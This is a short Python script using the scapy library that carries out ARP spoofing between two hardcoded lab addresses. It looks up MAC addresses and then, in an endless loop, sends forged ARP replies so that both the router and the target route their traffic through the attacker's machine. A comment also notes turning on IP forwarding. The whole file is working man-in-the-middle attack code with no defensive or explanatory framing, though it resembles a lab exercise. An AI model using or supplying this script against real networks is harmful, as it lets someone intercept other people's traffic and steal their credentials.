import time
import scapy.all as scapy


def get_mac(ip):

    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # op set 2 for arp response
    # psrc ip of router
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)


sent_packets_count = 0
try:
    while True:
        #echo1 > /proc/sys/net/ipv4/ip_forward
        spoof("10.0.2.1", "10.0.2.7")
        spoof("10.0.2.7", "10.0.2.1")
        sent_packets_count += 2
        print("\r[+] Packets sent: {}".format(sent_packets_count), end ="")
        time.sleep(2)
except KeyboardInterrupt:
    print(" > quit")